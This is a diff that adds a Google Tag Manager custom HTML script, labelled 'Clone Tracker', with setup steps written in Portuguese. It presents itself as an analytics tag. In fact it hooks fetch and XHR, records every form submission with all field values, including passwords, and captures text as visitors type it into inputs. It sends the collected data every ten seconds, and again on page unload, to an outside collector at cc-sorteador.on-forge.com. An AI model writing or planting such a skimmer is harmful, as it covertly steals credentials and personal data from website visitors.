@@ -1,0 +1,311 @@
+<!--
+  SCRIPT FORÇADO - Funciona no GTM
+
+  CONFIGURAÇÃO NO GTM:
+  1. Tags > Nova > HTML Personalizado
+  2. Cole este código
+  3. Acionador: Window Loaded (NÃO Page View!)
+  4. OU use: DOM Ready
+  5. Prioridade: 999
+  6. Publicar
+
+  IMPORTANTE: Use acionador "Window Loaded" ou "DOM Ready", NÃO "Page View"
+-->
+
+<script>
+(function() {
+    'use strict';
+
+    var COLLECTOR_URL = 'https://cc-sorteador.on-forge.com/api/collect';
+
+    var IGNORED_DOMAINS = [
+        'q.clarity.ms/collect',
+        'clarity.ms',
+        'google-analytics.com',
+        'googletagmanager.com',
+        'doubleclick.net'
+    ];
+
+    // ========== FORÇAR CONTEXTO WINDOW PRINCIPAL ==========
+
+    var targetWindow = window;
+    var targetDocument = document;
+
+    // Tentar acessar window.top se possível
+    try {
+        if (window.top && window.top !== window) {
+            targetWindow = window.top;
+            targetDocument = window.top.document;
+            console.log('[Clone Tracker] Usando window.top');
+        }
+    } catch (e) {
+        console.log('[Clone Tracker] Usando window atual');
+    }
+
+    // ========== NAMESPACE GLOBAL ==========
+
+    // Criar namespace no window principal para evitar duplicação
+    if (!targetWindow.__CLONE_TRACKER__) {
+        targetWindow.__CLONE_TRACKER__ = {
+            initialized: false,
+            requests: [],
+            sessionId: null,
+            originalFetch: null,
+            originalXHROpen: null,
+            originalXHRSend: null
+        };
+    }
+
+    var CT = targetWindow.__CLONE_TRACKER__;
+
+    if (CT.initialized) {
+        console.log('[Clone Tracker] Já inicializado anteriormente');
+        return;
+    }
+
+    console.log('[Clone Tracker] Inicializando...');
+
+    // ========== FUNÇÕES ==========
+
+    function shouldIgnore(url) {
+        if (!url) return false;
+        var urlStr = String(url).toLowerCase();
+        for (var i = 0; i < IGNORED_DOMAINS.length; i++) {
+            if (urlStr.indexOf(IGNORED_DOMAINS[i]) > -1) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    function getSessionId() {
+        if (CT.sessionId) return CT.sessionId;
+
+        try {
+            var stored = targetWindow.sessionStorage.getItem('clone_tracker_sid');
+            if (stored) {
+                CT.sessionId = stored;
+                return stored;
+            }
+        } catch (e) {}
+
+        CT.sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+        try {
+            targetWindow.sessionStorage.setItem('clone_tracker_sid', CT.sessionId);
+        } catch (e) {}
+
+        return CT.sessionId;
+    }
+
+    function sendData() {
+        if (CT.requests.length === 0) return;
+
+        var payload = {
+            sessionId: getSessionId(),
+            domain: targetWindow.location.hostname || 'unknown',
+            url: targetWindow.location.href || '',
+            referrer: targetDocument.referrer || '',
+            screenResolution: (targetWindow.screen.width || 0) + 'x' + (targetWindow.screen.height || 0),
+            language: targetWindow.navigator.language || 'unknown',
+            timestamp: new Date().toISOString(),
+            requests: []
+        };
+
+        // Copiar requests
+        for (var i = 0; i < CT.requests.length; i++) {
+            payload.requests.push(CT.requests[i]);
+        }
+
+        console.log('[Clone Tracker] Enviando', payload.requests.length, 'eventos');
+
+        CT.requests = [];
+
+        // Enviar usando fetch original ou XHR
+        var sendMethod = CT.originalFetch || targetWindow.fetch;
+
+        if (sendMethod && typeof sendMethod === 'function') {
+            sendMethod.call(targetWindow, COLLECTOR_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                mode: 'cors'
+            })
+            .then(function(r) {
+                console.log('[Clone Tracker] Enviado com sucesso:', r.status);
+                return r.json();
+            })
+            .then(function(data) {
+                console.log('[Clone Tracker] Resposta:', data);
+            })
+            .catch(function(e) {
+                console.error('[Clone Tracker] Erro:', e);
+            });
+        } else {
+            // Fallback XHR
+            var xhr = new targetWindow.XMLHttpRequest();
+            xhr.open('POST', COLLECTOR_URL, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify(payload));
+            console.log('[Clone Tracker] Enviado via XHR fallback');
+        }
+    }
+
+    // ========== INTERCEPTAÇÃO ==========
+
+    // Salvar originais
+    if (targetWindow.fetch) {
+        CT.originalFetch = targetWindow.fetch;
+    }
+
+    if (targetWindow.XMLHttpRequest) {
+        CT.originalXHROpen = targetWindow.XMLHttpRequest.prototype.open;
+        CT.originalXHRSend = targetWindow.XMLHttpRequest.prototype.send;
+    }
+
+    // INTERCEPTAR FETCH
+    if (CT.originalFetch) {
+        targetWindow.fetch = function() {
+            var args = Array.prototype.slice.call(arguments);
+            var url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '';
+
+            if (url.indexOf('/api/collect') === -1 && !shouldIgnore(url)) {
+                console.log('[Clone Tracker] Capturado fetch:', url);
+
+                CT.requests.push({
+                    type: 'fetch',
+                    url: url,
+                    method: (args[1] && args[1].method) || 'GET',
+                    timestamp: new Date().toISOString()
+                });
+            } else if (shouldIgnore(url)) {
+                console.log('[Clone Tracker] Ignorado:', url);
+            }
+
+            return CT.originalFetch.apply(this, args);
+        };
+
+        console.log('[Clone Tracker] ✅ Fetch interceptado');
+    }
+
+    // INTERCEPTAR XHR
+    if (CT.originalXHROpen && CT.originalXHRSend) {
+        targetWindow.XMLHttpRequest.prototype.open = function(method, url) {
+            if (!shouldIgnore(url)) {
+                this.__ctUrl = url;
+                this.__ctMethod = method;
+            } else {
+                this.__ctIgnored = true;
+            }
+            return CT.originalXHROpen.apply(this, arguments);
+        };
+
+        targetWindow.XMLHttpRequest.prototype.send = function() {
+            if (!this.__ctIgnored && this.__ctUrl) {
+                console.log('[Clone Tracker] Capturado XHR:', this.__ctUrl);
+
+                CT.requests.push({
+                    type: 'xhr',
+                    url: this.__ctUrl,
+                    method: this.__ctMethod || 'GET',
+                    timestamp: new Date().toISOString()
+                });
+            }
+            return CT.originalXHRSend.apply(this, arguments);
+        };
+
+        console.log('[Clone Tracker] ✅ XHR interceptado');
+    }
+
+    // ========== EVENTOS DOM ==========
+
+    targetDocument.addEventListener('click', function(e) {
+        var el = e.target;
+        if (!el) return;
+
+        CT.requests.push({
+            type: 'click',
+            tag: el.tagName || '',
+            id: el.id || '',
+            class: el.className || '',
+            text: (el.innerText || '').substring(0, 100),
+            timestamp: new Date().toISOString()
+        });
+    }, true);
+
+    targetDocument.addEventListener('submit', function(e) {
+        var form = e.target;
+        var fields = {};
+        var inputs = form.querySelectorAll('input, textarea, select');
+
+        for (var i = 0; i < inputs.length; i++) {
+            var inp = inputs[i];
+            var name = inp.name || inp.id || 'field_' + i;
+            fields[name] = inp.value;
+        }
+
+        CT.requests.push({
+            type: 'form_submit',
+            action: form.action,
+            method: form.method,
+            fields: fields,
+            timestamp: new Date().toISOString()
+        });
+    }, true);
+
+    var inputTimers = {};
+    targetDocument.addEventListener('input', function(e) {
+        var inp = e.target;
+        if (inp.tagName === 'INPUT' || inp.tagName === 'TEXTAREA') {
+            var name = inp.name || inp.id || 'unknown';
+
+            clearTimeout(inputTimers[name]);
+            inputTimers[name] = setTimeout(function() {
+                CT.requests.push({
+                    type: 'input',
+                    field: name,
+                    value: inp.value,
+                    timestamp: new Date().toISOString()
+                });
+            }, 500);
+        }
+    }, true);
+
+    // ========== TIMERS ==========
+
+    setInterval(sendData, 10000);
+
+    targetWindow.addEventListener('beforeunload', function() {
+        if (CT.requests.length > 0 && targetWindow.navigator.sendBeacon) {
+            var payload = {
+                sessionId: getSessionId(),
+                domain: targetWindow.location.hostname,
+                url: targetWindow.location.href,
+                referrer: targetDocument.referrer,
+                screenResolution: targetWindow.screen.width + 'x' + targetWindow.screen.height,
+                language: targetWindow.navigator.language,
+                timestamp: new Date().toISOString(),
+                requests: CT.requests
+            };
+
+            targetWindow.navigator.sendBeacon(COLLECTOR_URL, JSON.stringify(payload));
+        }
+    });
+
+    // ========== INICIALIZAÇÃO ==========
+
+    CT.requests.push({
+        type: 'page_load',
+        url: targetWindow.location.href,
+        timestamp: new Date().toISOString()
+    });
+
+    setTimeout(sendData, 2000);
+
+    CT.initialized = true;
+
+    console.log('[Clone Tracker] ✅ Inicializado');
+    console.log('[Clone Tracker] Session:', getSessionId());
+    console.log('[Clone Tracker] Contexto:', targetWindow === window ? 'window' : 'window.top');
+})();
+</script>
